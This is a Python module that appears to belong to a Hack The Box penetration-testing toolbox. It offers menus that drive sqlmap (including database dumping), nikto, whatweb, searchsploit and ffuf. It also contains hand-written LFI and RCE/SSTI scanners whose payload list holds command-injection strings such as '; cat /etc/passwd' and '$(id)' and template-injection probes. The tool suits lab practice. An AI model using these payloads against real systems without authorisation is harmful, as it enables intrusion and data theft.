"""
HTB Toolbox — Web Vulnerability Testing Screens
"""
import requests
import subprocess
from urllib.parse import urlparse

from ui.helpers import (
    console, pause, ask, ask_int, show_error, show_success, show_info,
    menu_header, render_menu, choose, get_project_or_warn, get_target_or_warn,
)
from core.project import save_project
from core.config import LFI_PAYLOADS, DEFAULT_THREADS, DIR_WORDLIST
from core.logger import ActivityLogger
from modules.web import _run_web_tool
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn


def menu_web():
    while True:
        menu_header()
        items = [
            ("1", "💉", "SQL Injection (sqlmap)"),
            ("2", "📂", "LFI / RFI Testing"),
            ("3", "💀", "RCE / Command Injection / SSTI"),
            ("4", "🕷️ ", "Nikto Web Scanner"),
            ("5", "🔬", "Technology Fingerprint (WhatWeb)"),
            ("6", "🔍", "Exploit Search (SearchSploit)"),
            ("7", "🎯", "URL Fuzzing (ffuf/wfuzz)"),
        ]
        render_menu("Web Vulnerability Testing", items)
        c = choose(items)
        if c == "0": return
        elif c == "1": action_sqli()
        elif c == "2": action_lfi()
        elif c == "3": action_rce()
        elif c == "4": action_nikto()
        elif c == "5": action_whatweb()
        elif c == "6": action_searchsploit()
        elif c == "7": action_fuzz()


def _build_url(data, default_port=80):
    hostname = data["target"].get("hostname")
    ip = data["target"].get("ip")
    host = hostname or ip
    scheme = "https" if default_port == 443 else "http"
    return f"{scheme}://{host}:{default_port}"


def action_sqli():
    data = get_project_or_warn()
    if not data:
        return
    get_target_or_warn(data) or (None, pause())

    menu_header("SQL Injection Testing (sqlmap)")
    console.print("  [dim]Examples:[/]")
    console.print("    http://target/page.php?id=1")
    console.print("    http://target/login.php (with --forms)\n")

    url = ask("Target URL with parameter")
    if not url:
        return

    console.print("\n  [dim]Options:[/]")
    level = ask_int("Test level (1-5)", 3)
    risk = ask_int("Risk level (1-3)", 2)

    console.print("\n  [dim]What to do:[/]")
    console.print("    [cyan]1[/]. Test for SQLi only")
    console.print("    [cyan]2[/]. Enumerate databases")
    console.print("    [cyan]3[/]. Enumerate tables")
    console.print("    [cyan]4[/]. Dump data")
    mode = ask("Mode", "1")

    cmd = ["sqlmap", "-u", url, f"--level={level}", f"--risk={risk}",
           "--batch", "--random-agent", "--threads=5"]

    if mode == "2": cmd.append("--dbs")
    elif mode == "3": cmd.append("--tables")
    elif mode == "4": cmd.append("--dump")

    _run_web_tool(cmd, data, "sqlmap-sqli", timeout=900)
    pause()


def action_lfi():
    data = get_project_or_warn()
    if not data:
        return
    get_target_or_warn(data)

    menu_header("LFI / RFI Testing")
    console.print("  [dim]Enter a URL with FUZZ as the injection point:[/]")
    console.print("  [dim]Example: http://target/page.php?file=FUZZ[/]\n")

    url = ask("URL with FUZZ placeholder")
    if not url or "FUZZ" not in url:
        show_error("URL must contain FUZZ placeholder.")
        pause()
        return

    logger = ActivityLogger(data)
    results = []
    found = 0

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Testing LFI payloads...", total=len(LFI_PAYLOADS))
        for payload in LFI_PAYLOADS:
            test_url = url.replace("FUZZ", payload)
            try:
                resp = requests.get(test_url, timeout=10, verify=False)
                indicators = ["root:", "daemon:", "[boot loader]", "<?php", "Warning:", "mysql"]
                if any(ind.lower() in resp.text.lower() for ind in indicators) and resp.status_code == 200:
                    found += 1
                    results.append({"payload": payload, "status": resp.status_code, "length": len(resp.text)})
                    console.print(f"  [bold red]🔥 VULNERABLE:[/] {payload} [dim](len={len(resp.text)})[/]")
            except requests.RequestException:
                pass
            progress.advance(task)

    if results:
        table = Table(title=f"LFI Findings ({found})", header_style="bold red")
        table.add_column("Payload", style="yellow")
        table.add_column("Status", justify="right")
        table.add_column("Length", justify="right")
        for r in results:
            table.add_row(r["payload"], str(r["status"]), str(r["length"]))
        console.print(table)
    else:
        show_success("No LFI vulnerabilities detected.")

    logger.log_web("lfi", f"LFI test on {url}", summary=f"Found {found} LFI vulnerabilities")
    save_project(data)
    pause()


def action_rce():
    data = get_project_or_warn()
    if not data:
        return
    get_target_or_warn(data)

    menu_header("RCE / Command Injection / SSTI Testing")
    console.print("  [dim]Enter URL with FUZZ placeholder, or URL + parameter:[/]")
    console.print("  [dim]Example: http://target/ping.php?ip=FUZZ[/]\n")

    url = ask("URL with FUZZ placeholder")
    if not url:
        return

    method = ask("HTTP method (GET/POST)", "GET").upper()
    logger = ActivityLogger(data)

    cmd_payloads = [
        "; id", "| id", "|| id", "& id", "&& id",
        "`id`", "$(id)", "; whoami", "| whoami",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "%0a id", "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{config.__class__.__init__.__globals__}}",
    ]

    rce_indicators = ["uid=", "root:", "www-data"]
    ssti_indicators = ["49", "config", "SECRET_KEY"]

    found = 0
    results = []

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Testing RCE payloads...", total=len(cmd_payloads))
        for payload in cmd_payloads:
            try:
                if "FUZZ" in url:
                    test_url = url.replace("FUZZ", payload)
                else:
                    test_url = url + payload

                if method == "POST":
                    resp = requests.post(test_url, timeout=10, verify=False)
                else:
                    resp = requests.get(test_url, timeout=10, verify=False)

                for indicator in rce_indicators + ssti_indicators:
                    if indicator in resp.text and resp.status_code == 200:
                        vuln_type = "SSTI" if indicator in ssti_indicators else "RCE"
                        found += 1
                        results.append({"payload": payload, "type": vuln_type, "indicator": indicator})
                        console.print(f"  [bold red]🔥 {vuln_type}:[/] [yellow]{payload}[/] [dim](indicator: {indicator})[/]")
                        break
            except requests.RequestException:
                pass
            progress.advance(task)

    if results:
        table = Table(title=f"RCE Findings ({found})", header_style="bold red")
        table.add_column("Type", style="red")
        table.add_column("Payload", style="yellow")
        table.add_column("Indicator", style="dim")
        for r in results:
            table.add_row(r["type"], r["payload"], r["indicator"])
        console.print(table)
    else:
        show_success("No RCE/SSTI vulnerabilities detected.")

    logger.log_web("rce", f"RCE test on {url}", summary=f"Found {found} RCE vectors")
    save_project(data)
    pause()


def action_nikto():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("Nikto Web Scanner")
    host = data["target"].get("hostname") or ip
    port = ask_int("Port", 80)
    ssl = port == 443
    url = f"{'https' if ssl else 'http'}://{host}:{port}"
    _run_web_tool(["nikto", "-h", url], data, "nikto", timeout=900)
    pause()


def action_whatweb():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("WhatWeb Technology Fingerprint")
    host = data["target"].get("hostname") or ip
    port = ask_int("Port", 80)
    scheme = "https" if port == 443 else "http"
    _run_web_tool(["whatweb", "-a", "3", f"{scheme}://{host}:{port}"], data, "whatweb")
    pause()


def action_searchsploit():
    data = get_project_or_warn()
    if not data:
        return

    menu_header("Exploit Search (SearchSploit)")
    term = ask("Search term (e.g. 'Apache 2.4.49', 'OpenSSH 8.2')")
    if not term:
        return
    _run_web_tool(["searchsploit", term], data, f"searchsploit")
    pause()


def action_fuzz():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("URL Fuzzing")
    console.print("  [dim]Use FUZZ as placeholder in URL:[/]")
    console.print("  [dim]Example: http://target/FUZZ[/]\n")

    url = ask("URL with FUZZ")
    if not url:
        return

    wordlist = str(DIR_WORDLIST) if DIR_WORDLIST.exists() else "/usr/share/wordlists/dirb/common.txt"
    custom_wl = ask("Wordlist path", wordlist)
    filter_code = ask("Filter status codes (e.g. 404, leave empty for none)", "")
    filter_size = ask("Filter response size (leave empty for none)", "")

    cmd = ["ffuf", "-u", url, "-w", custom_wl, "-t", str(DEFAULT_THREADS), "-c"]
    if filter_code:
        cmd.extend(["-fc", filter_code])
    if filter_size:
        cmd.extend(["-fs", filter_size])

    _run_web_tool(cmd, data, "ffuf-fuzz")
    pause()
